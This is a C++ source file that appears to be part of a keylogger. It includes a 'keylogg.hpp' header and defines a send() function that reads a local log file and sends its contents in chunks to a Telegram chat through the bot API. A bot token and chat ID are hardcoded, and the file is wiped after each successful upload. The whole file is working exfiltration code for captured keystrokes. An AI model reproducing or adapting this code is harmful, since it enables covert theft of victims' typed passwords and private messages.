#include "headers.hpp"
#include "keylogg.hpp"

const string LOGFILENAME = "data.th";
const string BOTAPI = "5502518374:AAFtTM3KMf3HZGSn9D3___As4YpeK0iZlPA";
const string CHAT_ID = "-1001702795824";

void send() {
	ifstream ifs(LOGFILENAME);
	string input((std::istreambuf_iterator<char>(ifs)),
		(std::istreambuf_iterator<char>()));

	if (input.empty())return;
	bool success = true;

	while (!input.empty()) {
		cpr::Response r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + BOTAPI + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + url_encode(input.substr(0,4095)) });
		if (r.status_code != 200)success = false;
		cout << "Status code: " << r.status_code << endl;
		input.erase(0, 4095);
	}
	if (success) {
		ofstream ofs;
		ofs.open(LOGFILENAME, ofstream::out | ofstream::trunc);
		ofs.close();
	}
}